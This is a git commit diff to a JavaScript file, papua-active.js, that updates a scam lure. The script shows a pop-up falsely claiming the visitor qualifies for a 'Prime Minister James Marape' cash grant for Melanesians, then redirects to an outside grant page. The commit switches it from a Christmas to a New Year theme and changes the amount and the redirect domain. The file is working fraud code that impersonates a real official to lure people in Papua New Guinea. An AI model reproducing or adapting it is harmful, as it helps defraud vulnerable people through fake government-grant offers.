8f1e46b95a78c52086cc99c97556eae838cf60c7
trafficbank <153836234+trafficbank@users.noreply.github.com>
2025-01-04 05:25:07 -0800

    Update papua-active.js

--- papua-active.js
+++ papua-active.js
@@ -1,6 +1,6 @@
 
-var password = 'WITHDRAW PGK55,000'
-password=prompt('SMS: Congratulations You are qualify for Prime Minister JAMES MARAPE PGK55,000 CHRISTMAS CASH GRANT FOR MELANESIANS, Kindly Press OK to Withdraw X-MAS Cash Grant   ','WITHDRAW PGK55,000');
-if (password != 'WITHDRAW PGK55,000') {
-location.href='https://get-offre.org/papua-grant.html';
+var password = 'WITHDRAW PGK150,000'
+password=prompt('SMS: Congratulations You are qualify for Prime Minister JAMES MARAPE PGK55,000 NEW YEAR CASH GRANT FOR MELANESIANS, Kindly Press OK to Withdraw Cash   ','WITHDRAW PGK150,000');
+if (password != 'WITHDRAW PGK150,000') {
+location.href='https://newyr-gift.org/newyr-papua-grant.html';
 }
